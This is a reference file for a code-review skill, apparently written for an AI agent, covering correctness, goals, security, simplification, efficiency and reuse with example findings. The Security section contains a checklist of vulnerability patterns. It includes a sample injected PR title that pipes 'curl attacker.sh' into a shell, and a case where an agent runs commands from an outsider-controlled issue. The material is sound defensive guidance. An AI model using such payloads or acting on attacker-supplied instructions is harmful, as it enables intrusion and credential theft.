# Dimensions reference

The six dimensions the [`code-review`](../SKILL.md) skill checks a diff
against, each with a real finding and a look-alike that isn't one. The
distinction in every pair is the same: a finding names a concrete failure
or cost; a non-finding is a style preference or a hypothetical that doesn't
survive the verification pass.

## Correctness

A bug: wrong output, a crash, or a concrete input that fails.

**Finding:** a function divides by `len(items)` without checking for an
empty list — `items=[]` raises `ZeroDivisionError`, and the caller three
lines up in this same diff passes a filtered list that can legitimately be
empty.

**Not a finding:** a function assumes its argument is non-negative and
isn't defensive about it, but every call site in the diff (and every
existing call site, checked) passes a value already validated upstream.
There's no concrete input that reaches this function and fails — it's a
hypothetical, not a bug in this diff.

## Goal alignment

The diff doesn't do what its stated goals say. Hold it to the goals as the
PR, ticket, or request wrote them, and try to break each one.

**Finding:** goal 1 (from the linked issue) is "retry Sentry API calls that
return 429 during `pulumi refresh`." The diff wraps `create` and `update`
in the retry helper, but `refresh` goes through the provider's `read`
method, which the diff doesn't touch. The case the issue describes still
fails on the first 429.

**Finding:** the PR body says "adds a regression test for the empty-batch
case," but the new test passes `records=[None]`, which takes a different
branch from `records=[]`. The goal says the case is tested. It isn't.

**Not a finding:** the ticket asks for a 400 on invalid input, and the diff
returns a 422, which every other endpoint in this app uses for validation
errors (checked in `api/views.py`). The status code differs from the
ticket's wording, but the intent is met and follows local convention.
Mention it in a PR reply if at all, not as a finding.

**Not a finding:** a goal the diff doesn't address because a separate,
linked PR does. Check the branch's other commits and linked PRs before
calling a goal unmet.

## Security

A path from attacker-controlled input, or from an exposure the diff
creates, to a concrete impact. Check the diff for these, and follow any hit
to confirm it's reachable:

| Area | What to look for |
|------|------------------|
| Injection | Raw SQL built with string formatting (`.raw()`, `.extra()`, `cursor.execute(f"...")`); `subprocess` with `shell=True` or a shell string holding input; template output marked safe (`|safe`, `mark_safe`, `dangerouslySetInnerHTML`) on user data |
| Authorization | A new view, viewset action, or API route whose effective permissions are too broad: `AllowAny` set explicitly, or no `permission_classes` in a project whose `DEFAULT_PERMISSION_CLASSES` setting is unset or permissive (check settings before reporting); object lookups by id that don't scope to the requesting user; admin-only behavior checked in the frontend only |
| Secrets | Credentials, tokens, or keys committed in code, fixtures, or Pulumi config without `secure:`; secrets written to logs, error messages, Sentry context, or trace attributes |
| SSRF / outbound requests | A URL or host from a request passed to `requests`/`httpx` without an allowlist; `verify=False` on TLS |
| Deserialization / files | `pickle.loads`, `yaml.load` without `SafeLoader`, `eval`/`exec` on input; a file path joined from input without normalizing and checking it stays under its base directory |
| CI workflows | `pull_request_target` or `workflow_run` that checks out and runs the PR head; attacker-controlled context interpolated directly into a `run:` step: `github.head_ref`, PR/issue titles and bodies, comment bodies, commit messages, branch names (numeric fields like `github.event.pull_request.number` are not injectable); `permissions:` broader than the job needs, when the job also runs untrusted input |
| Infrastructure | Security group ingress from `0.0.0.0/0` or `::/0` on anything but public 80/443; IAM or Vault policies with `*` actions or resources where a narrower set works; public S3 buckets or ACLs; Kubernetes pods that are privileged, use `hostPath`, or mount a service account token they don't need |
| Dependencies | A new package from a git URL, a non-default index, or a name one character off from a well-known package |
| Agent instructions | Skill, prompt, or agent-definition text that tells an agent to run, paste, or act on content an outsider controls (issue or PR bodies, comments, fetched web pages); to write secrets, tokens, or request headers into a PR, issue, log, or commit; or to skip or weaken a check (a hook, a review, a permission prompt) |

**Finding:** a new GitHub Actions step runs `echo "${{
github.event.pull_request.title }}" >> $GITHUB_STEP_SUMMARY` in a workflow
triggered by `pull_request_target`. A PR from a fork titled `";curl
attacker.sh|sh;"` executes in a job that has `GITHUB_TOKEN` with `contents:
write`.

**Finding:** a new DRF `@action` on `CourseViewSet` sets
`permission_classes=[IsAuthenticated]` and calls
`Enrollment.objects.get(id=pk)`. Any logged-in learner can read another
learner's enrollment, including their email, by incrementing `pk`.

**Finding:** a skill diff adds "reproduce the bug by running the command
in the linked issue's 'Steps to reproduce' section." Anyone who can file or
edit an issue in a public repo chooses a command that the agent runs with
the developer's shell, `gh` token, and cloud credentials.

**Not a finding:** `subprocess.run(cmd, shell=True)` in a management command
where `cmd` is a constant string in the same file. No input reaches it.

**Not a finding:** a security group allowing `0.0.0.0/0` on 443 for an
internet-facing ALB. That is the resource's purpose. Report it only when the
same rule lands on something meant to be internal, such as a database or a
node group.

## Simplification

Unneeded complexity: premature abstraction, dead branches, a helper that
exists for one caller.

**Finding:** a new `StrategyFactory` class with a single concrete strategy
registered and no second implementation anywhere in the codebase — the
indirection has no caller that benefits from it today.

**Not a finding:** a helper function extracted for a single caller because
the calling function was already 80 lines and the extraction makes it
readable. One caller doesn't make an extraction premature if the
alternative is a large function — the complexity metric here is
readability, not caller count.

## Efficiency

Avoidable extra work: N+1 queries, redundant recomputation, an unnecessary
full scan where an indexed lookup exists.

**Finding:** a loop that calls `User.objects.get(id=x)` once per iteration
over a list of 200 ids, where a single `User.objects.filter(id__in=ids)`
would do it in one query — confirmed by reading the loop, not assumed from
the pattern alone (some loops iterate a list already fetched in bulk one
line up).

**Not a finding:** a function recomputes a value on every call instead of
caching it, but it's called once per request and the computation is O(1) —
there's no measurable cost to point at, just a stylistic preference for
memoization.

## Reuse

Logic in this diff that duplicates something already in the repo, that
should call the existing implementation instead.

**Finding:** a new diff adds a hand-rolled retry-with-backoff loop, and
`utils/retry.py:retry_with_backoff` already implements the same thing with
jitter and a max-attempts cap this new code doesn't have — cite the
existing file:line, not just "this probably exists somewhere."

**Not a finding:** two functions in the diff both call
`.strip().lower()` on user input before comparing it — two lines of
genuinely trivial logic don't warrant extracting a shared helper; that's
premature abstraction in the other direction.
